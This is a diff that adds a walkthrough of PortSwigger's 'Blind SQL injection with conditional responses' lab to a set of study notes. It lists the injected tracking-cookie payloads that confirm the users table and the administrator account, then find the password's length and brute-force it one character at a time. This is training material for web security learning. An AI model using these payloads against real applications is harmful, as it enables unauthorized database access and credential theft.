@@ -35,4 +35,49 @@ Use the USERNAME_RANDOM and PASSWORD_RANDOM column and USERS_RANDOM table to get
 **STEP 6:**
 Login
 
+### [Lab 11: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
 
+**To solve: Login as administrator**
+
+**STEP 1**
+Finding vulnerable parameter which here is tracking cookie
+```html
+trackingId = "xxxxxxxxxxxxx' and 1=0--
+```
+
+> If this tracking id exists -> query returns value -> Welcome back message
+
+> If the tracking id doesn't exist -> query returns nothing > no welcome back message
+
+**STEP 2:**
+Confirm users table exist
+```html
+trackingId = xxxxxxxxxxxxx' and (select 'x' from users LIMIT 1) = 'x'--
+```
+
+**STEP 3:**
+Confirm that username administrator exists in users table
+```html
+trackingId = 'xxxxxxxxxxxxx' and (select username from users where username='administrator') = 'administrator'--
+```
+
+**STEP 4:**
+Enumerate the password length
+```html
+trackingId = 'RVLfBu6s9EZRUVYN' and (select username from users where username = 'administrator' and LENGTH(password) > 1 ) = 'administrator'--
+```
+
+> we graually increase the length of password till we don't get welcome back message
+
+> Till 19 character we get welcome back message -> password is exactly 20 character
+
+**STEP 5:**
+Enumerate the password
+```html
+trackingId = 'RvLfBu6s9EZRLVYN' and (select substring(password,1,1) from users where username='administrator')='a'--
+```
+
+> substring divides the password -> This give us oppurunity to bruteforce each character at a time
+
+**STEP 6:**
+Login
